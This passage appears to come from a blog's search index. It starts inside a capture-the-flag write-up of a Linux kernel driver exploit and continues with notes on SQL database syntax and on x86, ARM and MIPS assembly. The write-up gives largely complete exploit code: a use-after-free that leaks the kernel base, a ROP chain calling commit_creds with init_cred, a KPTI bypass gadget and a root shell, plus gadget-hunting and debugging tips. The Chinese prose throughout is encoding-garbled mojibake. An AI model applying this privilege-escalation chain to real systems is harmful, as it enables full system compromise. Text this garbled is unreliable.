exit(0);}size_t user_cs, user_ss, user_rflags, user_rsp;void save_status(){ __asm__(&quot;mov user_cs, cs;&quot; &quot;mov user_ss, ss;&quot; &quot;mov user_rsp, rsp;&quot; &quot;pushf;&quot; &quot;pop user_rflags;&quot; ); log_info(&quot;status saved&quot;);}int seq_open(){ int seq; if ( (seq=open(&quot;/proc/self/stat&quot;, O_RDONLY)) == -1) { die(&quot;seq open fail&quot;); } return seq;}#define MMSG_ALLOC 0x1111111#define MMSG_COPY 0x2222222#define MMSG_RECV 0x3333333#define MMSG_UPDATE 0x4444444#define MMSG_PUT_DESC 0x5555555#define MMSG_GET_DESC 0x6666666struct mmsg_arg { unsigned long token; int top; int size; char *data;};size_t kernel_base = 0;size_t kernel_offset = 0;size_t nokaslr = 0xffffffff81000000;size_t prepare_kernel_cred = 0xffffffff9248d790;size_t commit_creds = 0xffffffff8108d350;size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff93000e30;size_t pop_rdi_ret = 0xffffffff811aa376;size_t init_cred = 0xffffffff8264c9a0;size_t swapgs_iretq = 0xffffffff81c00ec6;size_t add_rsp_0x168_ret = 0xffffffff81909b8c;int mmsg_fd;int seq_fd;void exploit() { log_info(&quot;open device&quot;); mmsg_fd = open(&quot;/dev/mmsg&quot;, O_RDWR); if (mmsg_fd &lt; 0) { die(&quot;open device&quot;); } struct mmsg_arg arg; arg.token = 1; arg.top = 1; arg.size = 16; arg.data = malloc(16); size_t *buf = (size_t *)arg.data; buf[0] = 0x1145141145141145ull; buf[1] = 0; ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg); // bypass size check ioctl(mmsg_fd, MMSG_RECV, &amp;arg); // free head seq_fd = seq_open(); ioctl(mmsg_fd, MMSG_GET_DESC, &amp;arg); log_warning(&quot;start leak info&quot;); for(int i = 0; i &lt; 2; i ++) { log_debug(&quot;buf[%d] =&gt; 0x%lx\\n&quot;, i, buf[i]); } kernel_base = buf[0] - 0x20fac0; kernel_offset = kernel_base - nokaslr; add_rsp_0x168_ret += kernel_offset; pop_rdi_ret += kernel_offset; init_cred += kernel_offset; commit_creds += kernel_offset; swapgs_iretq += kernel_offset; log_info(&quot;kernel_offset =&gt; 0x%lx&quot;, kernel_offset); log_info(&quot;kernel_base =&gt; 0x%lx&quot;, kernel_base); buf[0] = add_rsp_0x168_ret; log_info(&quot;pollute =&gt; 0x%lx, maybe we can debug here&quot;, buf[0]); ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg); getchar(); __asm__( &quot;mov r15, 0xbeefdead;&quot; &quot;mov r14, pop_rdi_ret;&quot; // &lt;- rip here &quot;mov r13, init_cred;&quot; &quot;mov r12, commit_creds;&quot; &quot;mov rbp, swapgs_iretq;&quot; &quot;mov rbx, 0x55555555;&quot; &quot;mov r11, 0x66666666;&quot; &quot;mov r10, 0x77777777;&quot; &quot;mov r9, user_rsp;&quot; &quot;mov r8, 0x99999999;&quot; &quot;xor rax, rax;&quot; &quot;mov rcx, 0xaaaaaaaa;&quot; &quot;mov rdx, 8;&quot; &quot;mov rsi, rsp;&quot; &quot;mov rdi, seq_fd;&quot; // è¿™é‡Œå‡å®šé€šè¿‡ seq_operations-&gt;stat æ¥è§¦å‘ &quot;syscall&quot; );}int main() { signal(SIGSEGV, get_shell); save_status(); exploit();} cr3 bypass kptiï¼Œåœ¨é«˜ç‰ˆæœ¬ä½¿ç”¨ï¼Œåœ¨ +22 åœ°å€æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„gadgetã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748swapgs_restore_regs_and_return_to_usermode.text:FFFFFFFF81600A34 41 5F pop r15.text:FFFFFFFF81600A36 41 5E pop r14.text:FFFFFFFF81600A38 41 5D pop r13.text:FFFFFFFF81600A3A 41 5C pop r12.text:FFFFFFFF81600A3C 5D pop rbp.text:FFFFFFFF81600A3D 5B pop rbx.text:FFFFFFFF81600A3E 41 5B pop r11.text:FFFFFFFF81600A40 41 5A pop r10.text:FFFFFFFF81600A42 41 59 pop r9.text:FFFFFFFF81600A44 41 58 pop r8.text:FFFFFFFF81600A46 58 pop rax.text:FFFFFFFF81600A47 59 pop rcx.text:FFFFFFFF81600A48 5A pop rdx.text:FFFFFFFF81600A49 5E pop rsi.text:FFFFFFFF81600A4A 48 89 E7 mov rdi, rsp &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;.text:FFFFFFFF81600A4D 65 48 8B 24 25+ mov rsp, gs: 0x5004.text:FFFFFFFF81600A56 FF 77 30 push qword ptr [rdi+30h].text:FFFFFFFF81600A59 FF 77 28 push qword ptr [rdi+28h].text:FFFFFFFF81600A5C FF 77 20 push qword ptr [rdi+20h].text:FFFFFFFF81600A5F FF 77 18 push qword ptr [rdi+18h].text:FFFFFFFF81600A62 FF 77 10 push qword ptr [rdi+10h].text:FFFFFFFF81600A65 FF 37 push qword ptr [rdi].text:FFFFFFFF81600A67 50 push rax.text:FFFFFFFF81600A68 EB 43 nop.text:FFFFFFFF81600A6A 0F 20 DF mov rdi, cr3.text:FFFFFFFF81600A6D EB 34 jmp 0xFFFFFFFF81600AA3.text:FFFFFFFF81600AA3 48 81 CF 00 10+ or rdi, 1000h.text:FFFFFFFF81600AAA 0F 22 DF mov cr3, rdi.text:FFFFFFFF81600AAD 58 pop rax.text:FFFFFFFF81600AAE 5F pop rdi.text:FFFFFFFF81600AAF FF 15 23 65 62+ call cs: SWAPGS.text:FFFFFFFF81600AB5 FF 25 15 65 62+ jmp cs: INTERRUPT_RETURN_SWAPGS.text:FFFFFFFF8103EFC0 55 push rbp.text:FFFFFFFF8103EFC1 48 89 E5 mov rbp, rsp.text:FFFFFFFF8103EFC4 0F 01 F8 swapgs.text:FFFFFFFF8103EFC7 5D pop rbp.text:FFFFFFFF8103EFC8 C3 retn_INTERRUPT_RETURN.text:FFFFFFFF81600AE0 F6 44 24 20 04 test byte ptr [rsp+0x20], 4.text:FFFFFFFF81600AE5 75 02 jnz native_irq_return_ldt.text:FFFFFFFF81600AE7 48 CF iretq çœ‹åˆ«äººçš„åšæ³•ï¼Œå¥½åƒä¸éœ€è¦å…³æ³¨ripåé¢çš„å†…å®¹ï¼Œä½†æ˜¯æœ¬é¢˜æˆ‘æ²¡æœ‰ä½¿ç”¨è¿™ç§æ–¹å¼åšå‡ºæ¥ ğŸ‘€ã€‚ æœ€åéœ€è¦æˆ‘ä»¬è°ƒç”¨getshellå‡½æ•°ã€‚ 1234567891011121314151617181920 __asm__( &quot;mov r15, 0xbeefdead;&quot; &quot;mov r14, pop_rdi_ret;&quot; // &lt;- rip here &quot;mov r13, init_cred;&quot; &quot;mov r12, commit_creds;&quot; &quot;mov rbp, swapgs_restore_regs_and_return_to_usermode + 22;&quot; &quot;mov rbx, 0x55555555;&quot; &quot;mov r11, 0x66666666;&quot; &quot;mov r10, 0x77777777;&quot; &quot;mov r9, user_rsp;&quot; &quot;mov r8, 0x99999999;&quot; &quot;xor rax, rax;&quot; &quot;mov rcx, 0xaaaaaaaa;&quot; &quot;mov rdx, 8;&quot; &quot;mov rsi, rsp;&quot; &quot;mov rdi, seq_fd;&quot; );get_shell(); tips commit_creds(prepare_kernel_cred (0)) =&gt; ç®€åŒ–ä¸º commit_creds(&amp;init_cred) init_cred: init è¿›ç¨‹çš„æƒé™ï¼Œä¸ºrootï¼Œåœ¨ /proc/kallsyms å†… å¯»æ‰¾ gadget æ—¶å¯èƒ½å¯»æ‰¾åˆ°çš„gadgetä¸èƒ½ä½¿ç”¨ï¼ŒæŠ¥é”™ä¸º kernel tried to execute NX-protected pageï¼Œè¯´æ˜å…¶åœ°å€ä¸å¯è®¿é—®ï¼Ÿé‚£å°±åªèƒ½æ¢äº† ä¸ºä»€ä¹ˆæ‰¾ä¸å¯¹gadget?æˆ–è€…æ ¹æœ¬æ²¡æœ‰æ‰¾åˆ°ğŸ¤¡ã€‚å’Œå‚è€ƒçš„çœ‹çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°gadgetåœ°å€æ ¹æœ¬å°±æ²¡æ‰¾å¯¹ã€‚ ropper + ROPgadget + ropr ä¸‰ä¸ªå·¥å…·ä¸€èµ·ä½¿ç”¨ï¼Œè·å¾—ä¸‰ä¸ªgadgetæ–‡ä»¶ã€‚ extract-vmlinux + vmlinux-to-elf å·¥å…· å¦‚ä½•ä¸‹æ–­ç‚¹ï¼Ÿ åœ¨æƒ³æš‚åœçš„çš„åœ°æ–¹ä½¿ç”¨ getchar() åœæ­¢åä¸€è·¯si åœ¨å›ºå®šçš„æŒ‡ä»¤åœ°å€ä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯éœ€è¦äº‹å…ˆçŸ¥é“åœ°å€ã€‚ä½†æ˜¯ropæ—¶ï¼Œåœ°å€ä¸€èˆ¬éƒ½æ˜¯çŸ¥é“çš„ã€‚ åœ¨å›ºå®šçš„æŒ‡ä»¤ä¸‹æ–­ç‚¹ï¼Œæ¯”å¦‚æ­¤é¢˜å°±å¯ä»¥åœ¨åœ¨ add rsp é‚£ä¸€æ¡æŒ‡ä»¤ä¸‹æ–­ç‚¹ 12345678910111213 0xffffffff81909b8c add rsp, module_ioctl+56 &lt;0x168&gt; 0xffffffff81909b93 retpwndbg&gt; tele 0xffffc900001c7df8+0x168 00:0000 0xffffc900001c7f60 0x44444444 /* 'DDDD' */01:0008 0xffffc900001c7f68 0x33333333 /* '3333' */02:0010 0xffffc900001c7f70 0x22222222 /* '&quot;&quot;&quot;&quot;' */03:0018 0xffffc900001c7f78 0xbbbb111104:0020 0xffffc900001c7f80 0xbbbb222205:0028 0xffffc900001c7f88 0x24606:0030 0xffffc900001c7f90 0x1111000007:0038 0xffffc900001c7f98 0x9999999908:0040 0xffffc900001c7fa0 0x88888888","link":"/2023/07/28/peekgeek%20mmsg/"},{"title":"å¸¸ç”¨æ•°æ®åº“åŸºæœ¬è¯­æ³•","text":"ç®€å•å­¦ä¹ å¢åˆ æ”¹æŸ¥ ä¸‰ä¸ªæœ€å¹¿æ³›ä½¿ç”¨çš„å¼€æº RDBMSï¼šSQLiteã€MySQL å’Œ PostgreSQLã€‚å…³ç³»å‹æ•°æ®åº“ å› ä¸ºSQLçš„æ ‡å‡†ï¼Œä¸‰ä¸ªæ•°æ®åº“å·®ä¸å¤šçš„è¯­æ³•ã€‚ SQLMySQL å…¶å®æ˜¯å¼€æº MariaDB æ•°æ®åº“ 1234567891011-- åˆ›å»ºCREATE DATABASE db_name; -- åˆ é™¤DROP DATABASE db_name; -- æŸ¥çœ‹show databases;-- è¿æ¥use database_name; è¡¨ 123456789101112131415-- åˆ›å»ºCREATE TABLE table_name ( column_name data_type å±æ€§ );SHOW tables;-- åˆ é™¤DROP TABLE table_name;-- æŸ¥è¯¢SELECT column_name from table_name;-- å¢åŠ INSERT into table_name(column_name) values(&quot;xxx&quot;); æ•°æ®ç±»å‹ æŸ¥è¯¢é™å®š 12345678-- æ’åºorder by-- å±æ€§é™å®šWHERE, AND, OR-- ç»“æœä¸ªæ•°limit PostgreSQL æ•°æ®åº“ 123456789-- åˆ›å»ºCREATE DATABASE db_name; -- åˆ é™¤DROP DATABASE db_name; -- æŸ¥çœ‹-- è¿æ¥ è¡¨ 12345678910111213-- åˆ›å»ºCREATE TABLE table_name ( column_name data_type å±æ€§ );-- åˆ é™¤DROP TABLE table_name;-- æŸ¥è¯¢SELECT column_name from table_name;-- å¢åŠ INSERT into table_name(column_name) values(&quot;xxx&quot;); æŸ¥è¯¢ 12345678-- æ’åºorder by-- å»é‡distinct-- å±æ€§é™å®šWHERE, AND, OR SQLite sqlite3 å‘½ä»¤ 123456789.help; -- å¸®åŠ©ä¿¡æ¯.open test.db; -- æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰å°±åˆ›å»º.show; -- æ˜¾ç¤ºä¸€ç³»åˆ—å±æ€§.quit -- é€€å‡º.databases -- æ˜¾ç¤ºæ•°æ®åº“ åˆ›å»ºæ•°æ®åº“ 123-- è¯»å–æˆ–è€…åˆ›å»ºsqlite3 name.open name å¯¼å…¥å¯¼å‡ºæ•°æ®åº“ 123.dump -- å°†æ•°æ®åº“å¯¼å‡ºSQL æ–‡ä»¶ sqlite3 test.db .dump &gt; test.sqlsqlite3 test.db &lt; test.db åˆ›å»ºè¡¨ 12345678910.tables -- æ˜¾ç¤ºè¡¨.schema -- è¡¨çš„ä¿¡æ¯CREATE TABLE table_name ( column_name type primary key)DROP TABLE database.table_name;INSERT INTO table_name(&quot;cloumn_name&quot;) values (&quot;value&quot;) æŸ¥è¯¢ 1-- è¿˜æ˜¯SELECT è¯­å¥ ç¼–ç¨‹æ“ä½œ ä½¿ç”¨Cè¯­è¨€æ“ä½œæ•°æ®åº“ï¼Œå…¶ä½™ç¼–ç¨‹è¯­è¨€æ“ä½œæ•°æ®åº“ä¹Ÿå·®ä¸å¤šï¼Œä¸»è¦æ˜¯å†™SQLè¯­å¥çš„æ“ä½œã€‚","link":"/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"},{"title":"æ±‡ç¼–å­¦ä¹ ","text":"åŸºæœ¬çš„æ±‡ç¼–å­¦ä¹ ã€‚ å­¦ä¹ ç›®æ ‡ï¼šé¦–å…ˆèƒ½çœ‹æ‡‚ã€‚ç„¶åå°è¯•ç¼–å†™ shellcodeã€‚ ä¸ªäººä¹ æƒ¯å°å†™æŒ‡ä»¤ã€‚ little-endian å¸¸è§çš„æ±‡ç¼–æ ¼å¼ Intelæ ¼å¼ã€‚ AT&amp;Tï¼Œå®é™…ä½¿ç”¨ä¹Ÿå¾ˆå¸¸è§(Linuxä¸­é»˜è®¤çš„æ ¼å¼) éƒ¨åˆ†åè¯ 1234ISA: Instruction Set Architecture, æŒ‡ä»¤é›†æ¶æ„RISC: Reduced Instruction Set Computer, ç²¾ç®€æŒ‡ä»¤é›†è®¡ç®—æœºCISC: Complex Instruction Set Computer, å¤æ‚æŒ‡ä»¤é›†è®¡ç®—æœºABI: application binary interface ç¯å¢ƒé—®é¢˜ æœ¬æœº linux: ubuntu &amp;&amp; kali virtual machineï¼›CPU: AMDã€‚ æ— æ³•ç›´æ¥è¿è¡Œ arm å’Œ mips æ¶æ„çš„ç¨‹åº armå¯ä»¥ä½¿ç”¨æ‰‹æœºç»ˆç«¯ Termux è¿›è¡Œè¿è¡Œã€‚æˆ–è€…è´­ä¹°äº‘æœåŠ¡å™¨? ç¯å¢ƒå®‰è£… åŸºæœ¬ç¯å¢ƒ user mode+kernel modeã€‚ è¿è¡Œç¨‹åºåªéœ€è¦ä¸€ä¸ªqemu-user å°±è¡Œï¼Œå¯åŠ¨ç³»ç»Ÿéœ€è¦ qemu-system-xxx ç”šè‡³å¯ä»¥ qemu-system è·‘kernelï¼Œç„¶åè·‘ç¨‹åºğŸ˜‚12# qemu userç”¨æˆ·æ€ systemå¯åŠ¨å†…æ ¸é•œåƒsudo apt install qemu-user arm ç¯å¢ƒ 1234567# gun ç¼–è¯‘å·¥å…·é“¾ + åŠ¨æ€é“¾æ¥åº“sudo apt list gcc* | grep armsudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu# optional: qemu arm system modesudo apt list &quot;qemu*&quot; # å¯»æ‰¾å¯¹ç”¨çš„archsudo apt install qemu-system-arm qemu-system-aarch64 mips ç¯å¢ƒ. 12345# gun ç¼–è¯‘å·¥å…·é“¾sudo apt install gcc-mips-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64# optional: qemu mips system mode, ç›®å‰æ²¡è§è¿‡ï¼Œ user mode åº”è¯¥å¤Ÿäº†sudo apt install qemu-system-mips gdb 1sudo apt install gdb gdb-multiarch æµ‹è¯• qemu-user ä½¿ç”¨ -g gdbæ¨¡å¼ ç¡®å®šgdbè°ƒè¯•ç«¯å£ qemu-system ä½¿ç”¨ -s -S æˆ–è€… -gdb tcp:1234 gdbserverç­‰å¾…è¿æ¥ï¼Œé»˜è®¤ç«¯å£ 1234 ç¼–ç¨‹æµ‹è¯• 1234567#include &lt;stdio.h&gt;int main() { printf(&quot;hello, world!&quot;); getchar(); return 0;} å¯»æ‰¾åŠ¨æ€é“¾æ¥åº“ã€‚lib-&gt;/usr/lib çš„é“¾æ¥ 1$ ls -al /usr/lib | grep arm # aarch64 mips... arm æµ‹è¯•ï¼Œä¸çŸ¥ä¸ºä»€ä¹ˆï¼Œæµ‹è¯•æ—¶ -gæ”¾å‰é¢æ‰æˆåŠŸ 1234567891011121314# ç¼–è¯‘arm-linux-gnueabi-gcc hello.c -o helloarm -gaarch64-linux-gnu-gcc hello.c -o helloaarch -g# è¿è¡Œ$ qemu-arm -L /usr/arm-linux-gnueabi ./helloarm$ qemu-aarch64# è°ƒè¯•$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./helloarm $ gdb-multiarchgdb&gt; set arch arm # aarch64gdb&gt; target remote localhost:1234xxx mips æµ‹è¯•, ä¸armç±»ä¼¼ 12$ mips-linux-gnu-gcc hello.c -o hellomips -g... x86 CISC x86 intel x86 é€šç”¨å¯„å­˜å™¨ 12345678910111213; é€šç”¨eax: ç´¯åŠ å™¨ebx: ä¸€èˆ¬åŸºå€å¯„å­˜å™¨ï¼Œbaseecx: counter, åœ¨loopæ—¶ï¼Œé»˜è®¤è®¡æ•°edx: ä¸€èˆ¬ç”¨äºå­˜æ”¾dataesi: source index, å¤„ç†å­—ç¬¦ä¸²å¸¸ç”¨edi: destinatin index, å¤„ç†å­—ç¬¦ä¸²å¸¸ç”¨esp: stack pointer, æ ˆé¡¶ebp: base pointer, æ ˆåŸºå€eip: æŒ‡å‘å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ æ ‡å¿—ä½ eflags 12345678CF: carry flag, è¿›ä½ZF: zero, 0SF: sign, ç¬¦å·OF: overflow, æº¢å‡ºTF: trap, è·Ÿè¸ªIF: interrupt, ä¸­æ–­PF: parity, å¥‡å¶... æ®µå¯„å­˜å™¨ 123456cs: code segment ä»£ç æ®µds: data æ•°æ®æ®µss: stack å †æ ˆæ®µes: extend æ‰©å±•æ®µfs: æ•°æ®æ®µgs: æ•°æ®æ®µ æ§åˆ¶å¯„å­˜å™¨ 12; æŸäº›ä¿æŠ¤æ¨¡å¼cr0-cr4 å¯»å€ 12movlea ç®—æœ¯æŒ‡ä»¤ 1234567891011121314151617181920; åŸºæœ¬è¿ç®—addsubmuldivincdec; é€»è¾‘è¿ç®—cmpandorxornot; ç§»ä½æ“ä½œshl ; shift leftshrsal ; shift arithmetic left ç®—æ•°å·¦ç§»sar è·³è½¬ 1234; jmp ç±»jmpjb ; blowjg ; greater å‡½æ•°è°ƒç”¨ 123call function; call æ‰§è¡Œæ—¶ï¼Œä¿å­˜ eip+4, å¹¶è·³è½¬åˆ°å¯¹åº”åœ°å€; å‚æ•°ä¼ é€’ï¼Œä½¿ç”¨æ ˆä¼ é€’å‚æ•° æ ˆå¸§ 1234567; åœ¨è°ƒç”¨å­ç¨‹åºæ—¶ï¼Œä¼šå¼€è¾Ÿå­ç¨‹åºçš„æ ˆå¸§ã€‚espå’Œebpä¿å­˜æ ˆé¡¶å’Œæ ˆåº•; åœ¨è¿”å›çˆ¶ç¨‹åºéœ€è¦è¿˜åŸesp, ebpæŒ‡é’ˆã€‚; æ ˆ ä½åœ°å€ç”Ÿé•¿; spè‡ªåŠ¨å˜åŒ–push ebx ; sp-4pop rax ; sp+4 ç³»ç»Ÿè°ƒç”¨ 12; ç³»ç»Ÿä¸­æ–­å¤„ç†syscallint 0x80 ; eaxç³»ç»Ÿè°ƒç”¨å· ebx, ecx, edxå¯¹åº”å‡½æ•°å‰ä¸‰ä¸ªå‚æ•° x86-64 å®é™…ä¸Šx86-64ä¸AMD64åŸºæœ¬æ˜¯åŒä¸€ä¸ªISAï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨è´­ä¹°çš„Intelæˆ–è€…AMDç”Ÿäº§çš„CPUï¼Œéƒ½å±äºx86-64çš„ISAã€‚ x86-64: 64ä½ï¼Œå¯å¯»å€ 2^64, å…¼å®¹x86 123456789101112; 32ä½ r-&gt;bæ¯”å¦‚ rax-&gt;eaxrax, rbx, rcx, rdxrsi, rdirsp, rbpr8: r8d 32ä½ å¯„å­˜å™¨ï¼Œä½32ä½r9: r9dr10: ...r11: ...r12: ...r13: ...r14: ...r15: ... å‡½æ•°è°ƒç”¨çº¦å®š, ä¸x86ç›¸å·®è¾ƒå¤§ 12345; å‡½æ•°å‚æ•°rdi, rsi, rdx, rcx, r8, r9 ; ä¼ é€’å‰6ä¸ªå‚æ•°ï¼Œç¬¬7ä¸ªå‚æ•°å¼€å§‹å’Œx86ä¸€æ ·ä½¿ç”¨æ ˆä¼ é€’; è¿”å›å€¼rax ç³»ç»Ÿè°ƒç”¨ 123; syscallrax: ç³»ç»Ÿè°ƒç”¨å·; å‚æ•°ä¼ é€’ä¸å‡½æ•°ä¸€è‡´ï¼Œ rdi, rsi... ARM RISC ARMæŒ‡ä»¤æ ¼å¼ 123456label op-code oprand1 oprand2 oprand3 ... @commit@ æ›´åŠ å­¦æœ¯ rd: destination; rn: å¯„å­˜å™¨ä¸­ç”¨äºç®—æœ¯è¿ç®—çš„æ“ä½œæ•°; shifter_operand: æ•°æ®å¤„ç†æŒ‡ä»¤&lt;opcode&gt; {&lt;cond&gt;} {S} &lt;rd&gt;,&lt;rn&gt;,&lt;shifter_operand&gt;@ æ³¨é‡Š `@`, `//` `/**/` `;` ARMv7 32ä½æŒ‡ä»¤é›†A32ï¼Œå…¼å®¹16ä½æŒ‡ä»¤é›†T16 ç”±äºARMv7 å…¼å®¹ ARMå’Œ ThumbæŒ‡ä»¤é›†ï¼ŒåŒºåˆ†ä¸¤ä¸ªæŒ‡ä»¤é›†ï¼š addr &amp; 1 == 1ä»£è¡¨thumbæŒ‡ä»¤é›† ARMv7é€šç”¨å¯„å­˜å™¨ 1234567r0-r3: args, å‡½æ•°å‰å››ä¸ªå‚æ•°ï¼Œè¿”å›å€¼ä¹Ÿä¼šå­˜å…¥r0. r4-r10: r11: fp, frame pointerr12: ip, Intra-Procedure-call scratch register, åœ¨æ–°ç‰ˆæœ¬å½“ä½œé€šç”¨å¯„å­˜å™¨ä½¿ç”¨ï¼Œä¼šåœ¨blæ—¶å¼•å‘bugr13: sp, stack pointerr14: lr, link registerr15: pc, program count, æŒ‡å‘ä¸‹ä¸€æ¡éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤ æ ‡å¿—ä½(CPSR: program status reg),å¦‚æœæƒ³æ”¹å˜ï¼Œéœ€è¦åœ¨æŸäº›æŒ‡ä»¤ååŠ  s (sub -&gt; subs) 1234567N: negative, è¿ç®—ç»“æœ&gt;=0 N=0, è´Ÿæ•°ï¼ŒN=1Z: zero, ä¸º0C: carry, è¿›ä½V: overflow æœ‰æº¢å‡º; cmp å¯ä»¥æ”¹å˜cmp r0, r1 mov ç«‹å³æ•° 12345mov r0, #1 @ r0 &lt;- 1@ ç‰¹æ®Šå¯„å­˜å™¨ cpsr || spsrmrs r0, cpsr @ r0 &lt;- cpsrmsr cpsr, r1 @ cpsr &lt;- r1 è®¿é—®å†…å­˜ 123456789@ ä¸èƒ½ç›´æ¥åƒintel movè®¿é—®å†…å­˜, ä½¿ç”¨ load, storeå‘½ä»¤é—´æ¥è®¿é—®å†…å­˜ldr rd, [rn , #offset] @ load registerstr rd, [rn, #offset]ldm @ load multiplestm ; ä¾‹å­ldr r0, =0X20000002 @ r0=0X20000002ï¼ŒåŠ è½½åœ°å€åˆ°å¯„å­˜å™¨ str r1, [r0] @ r1 ä¸­çš„å€¼å†™å…¥åˆ° r0 ä¸­æ‰€ä¿å­˜çš„åœ°å€ä¸­ ç®—æœ¯æŒ‡ä»¤ 12345678910111213141516171819@ åŸºæœ¬ç®—æ•°è¿ç®—add rd, rn, rm @ rd = rn + rmsub rd, rn, rm @ rd = rn - rmmul rd, rn, rm @ rd = rn * rmsdiv rd, rn, rm @ rd = rn / rm, s(ign)div u(nsign)div@ æƒ³æ”¹å˜æ ‡å¿—ä½, åŠ  's' =&gt; subs...@ é€»è¾‘è¿ç®—and rd, rn @ rd = rd &amp; rnand rd, rn, #imm @ rd = rn &amp; #immorr rd, rn @ rd = rd | rneor rd, rn @ rd = rd ^ rn@ ç§»ä½æ“ä½œlsl @ logic shift left é€»è¾‘å·¦ç§»lsr @ é€»è¾‘å³ç§»asr @ arithmetic shift right ç®—æ•°å³ç§»ror @ rotate right å¾ªç¯å³ç§» ç¨‹åºè·³è½¬ 12345678910b: ç›´æ¥è·³åˆ°labelã€‚ branchbx: è·³è½¬+çŠ¶æ€åˆ‡æ¢ @ ARM/Thumb æ¨¡å¼(ä½¿ç”¨ä¸€æ¬¡ï¼Œåˆ‡æ¢ä¸€æ¬¡)bl: b + link, é¦–å…ˆä¿å­˜ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€åˆ°lr, ç„¶åæ”¹å˜pcã€‚blx: bl+bx@ æ¡ä»¶è·³è½¬, çŠ¶æ€å¯„å­˜å™¨eq: equal ç›¸ç­‰ne: not eqlt: less le: less equal å‡½æ•°è°ƒç”¨ 1@ ä»ç„¶æ˜¯ä½¿ç”¨ `b` æŒ‡ä»¤è°ƒç”¨å‡½æ•° æ ˆå¸§ç›¸å…³ 1234567891011121314151617@ sp, fp ç»´æŠ¤æ ˆå¸§çš„çŠ¶æ€, æ ˆå‘ ä½åœ°å€ç”Ÿé•¿fp -&gt; +-------+ | frame |sp -&gt; +-------+@ push/pop å¯ä»¥æ“ä½œå¤šä¸ªå¯„å­˜å™¨ï¼Œç”šè‡³å¯ä»¥æ§åˆ¶pc; spè‡ªåŠ¨å˜åŒ–@ ä¸‹é¢æ˜¯å¸¸è§çš„å‡½æ•°è°ƒç”¨å‡ºç°å‡ºç°çš„gadget push {r0-r4, lr} @ é¡ºåºæ˜¯ push r12; push r4; push r3 ......pop {r0-r4, pc} @ é¡ºåºæ˜¯ pop r0; pop r1; ...@ ç­‰ä»·äº push, å…ˆè®¡ç®—spçš„å€¼?stmfd sp!, {r0-r4, r12}@ ç­‰ä»·äº popldmfd sp!, lr ç³»ç»Ÿä¸­æ–­ 123456789101112@ é€šè¿‡vector_swi/svc è·å¾—ç³»ç»Ÿè°ƒç”¨å·swi #immsvc #imm@ O(old)ABI å½¢å¼mov r0, #34swi 12@ E(extended)ABI å½¢å¼ï¼Œç«‹å³æ•° immè¢«å¿½ç•¥,ç”±r0å†³å®šmov r0, #12mov r1, #34swi 0 ARMv8 ä¸ armv7 å­˜åœ¨ä¸€å®šçš„åŒºåˆ« 64ä½æŒ‡ä»¤é›† aarch64, å…¼å®¹32ä½ aarch32 12aarch64: 64-bit registers and memory accesses, new instruction setï¼›aarch32: backwards compatible with ARMv7-A ARMv8 é€šç”¨å¯„å­˜å™¨ 123456789101112131415x0-x31x0-x7: å‡½æ•°å‰8ä¸ªå‚æ•°å€¼x8: å‡½æ•°è¿”å›å€¼x19-x28: æ²¡ç‰¹æ®Šç”¨é€” x29: fp frame pointerx30: lrx31: zr, zero register, æ’0x32: pc, ä¸èƒ½åƒarmv7ä¸€æ ·è¢«ä¿®æ”¹@ ä¹Ÿå¯ä½¿ç”¨32ä½çš„ w0...å¯„å­˜å™¨, å¯æ‰©å±•ä½¿ç”¨@ spå¯¹åº”çš„ç‰©ç†å¯„å­˜å™¨æœ‰å¦‚ä¸‹å››ä¸ª(æŸä¸€æ—¶åˆ»åªèƒ½å¯¹åº”ä¸‹é¢å…¶ä¸­ä¸€ä¸ª)SP_EL0å’ŒSP_EL1SP_EL2SP_EL3 SPSR æ›¿ä»£äº† CPSR å†…å­˜è®¿é—® 1234@ load &amp; store, å…¼å®¹armv7 ldrldp @ load pair ä¸€å¯¹ã€‚ ldp x8, x2, [x0, #0x10] @ å°†x8&lt;-(x0+0x10), x2&lt;-(x0+0x10+8)stp @ store pair å‡½æ•° 12345@ å‚æ•°ä¼ é€’x0-x7: å‡½æ•°å‰8ä¸ªå‚æ•°å€¼x8: å‡½æ•°è¿”å›å€¼@ aarch64æ²¡æœ‰pushå’Œpop æŒ‡ä»¤ ç³»ç»Ÿè°ƒç”¨ 12@ supervisor callsvc #imm TrustZone ç›¸å…³xxx ARMv9xxx Mips RISCï¼Œ Microprocessor without Interlocked Pipeline Stages mips æ˜¯big-endian, mipselæ˜¯ little-endian æ ¼å¼ 123456789# æ ¹æ®ä½æ•°31-26 25-21 20-16 15-11 10-6 5-0op-code rs rt rd shamt func# æ³¨é‡Šä½¿ç”¨ `#`rd: register destinationrt: targetrs: source é€šç”¨å¯„å­˜å™¨ï¼Œ 32ä¸ª 12345678910111213141516$0-$31 # æœ‰å„è‡ªçš„åŠ©è®°ç¬¦ï¼Œçœ‹æ±‡ç¼–æ—¶å¤šä½¿ç”¨åŠ©è®°ç¬¦$0: $zero # æ’01: $at # 2-3: $v0-v1 # value å‡½æ•°è¿”å›å€¼4-7: $a0-a3 # arg å‡½æ•°å‚æ•°8-15: $t0-t7 # temp16-23: $s0-s7 # save ä¿ç•™24-25: $t8-t9 # temp16-27: $k0-k1 # å¼‚å¸¸æˆ–ä¸­æ–­28: $gp # global pointer29: $sp # stack pointer30: $fp, s8 # frame pointer 31: $ra # ret addr; ç‰¹æ®Špc: program cunter æŒ‡ä»¤æ ¼å¼ 123r: register format # ä½¿ç”¨å¯„å­˜å™¨i: immediate # ä½¿ç”¨ç«‹å³æ•°j: jump 